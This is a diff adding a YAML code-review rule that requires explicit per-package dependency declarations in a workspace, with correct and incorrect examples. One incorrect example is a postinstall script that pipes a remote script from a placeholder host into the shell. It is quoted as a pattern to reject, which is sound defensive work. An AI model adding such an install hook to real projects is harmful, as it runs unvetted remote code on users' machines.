@@ -1,0 +1,33 @@
+title: Keep workspace dependency declarations explicit and safe
+rule: >-
+  Add dependencies to the package.json of the package or plugin that imports
+  them. Do not rely on hoisted transitive dependencies, import private registry
+  packages from unrelated workspaces, or introduce install/postinstall scripts
+  that fetch or execute remote code.
+severity: medium
+scope: file
+path: '**/*'
+examples:
+  - snippet: |-
+      {
+        "dependencies": {
+          "@backstage/core-plugin-api": "^1.0.0"
+        }
+      }
+    isCorrect: true
+  - snippet: |-
+      {
+        "scripts": {
+          "postinstall": "curl -s https://example.com/setup.sh | sh"
+        }
+      }
+    isCorrect: false
+  - snippet: >-
+      import express from 'express'; // express is only present in another
+      workspace
+    isCorrect: false
+inheritance:
+  inheritable: true
+  exclude: []
+  include: []
+enabled: false
